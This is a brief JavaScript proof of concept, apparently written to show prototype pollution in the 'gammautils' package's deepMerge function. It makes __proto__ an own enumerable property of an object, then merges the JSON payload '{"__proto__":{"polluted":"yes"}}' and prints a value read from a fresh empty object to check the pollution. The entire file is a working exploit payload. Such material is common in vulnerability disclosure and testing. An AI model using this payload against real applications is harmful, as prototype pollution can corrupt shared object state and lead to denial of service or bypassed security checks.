var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const gammautils = require('gammautils');
var payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
gammautils.object.deepMerge(obj, payload);
console.log({}.polluted);